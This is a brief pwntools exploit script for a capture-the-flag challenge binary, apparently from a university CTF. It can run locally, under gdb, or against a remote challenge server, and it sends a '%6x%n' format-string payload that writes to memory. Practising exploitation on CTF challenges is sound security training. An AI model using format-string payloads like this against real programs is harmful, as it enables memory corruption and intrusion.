from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10006
LOCAL = True
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *main+100
        b *main+105
        b *main+139
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')
# target_address = p64(e.symbols["target"])
payload = b'%6x%n'
p.sendline(payload)

if LOCAL:
    sleep(2)
    print(p.recv().decode())
    pause()
else:
    print(p.recvall().decode())
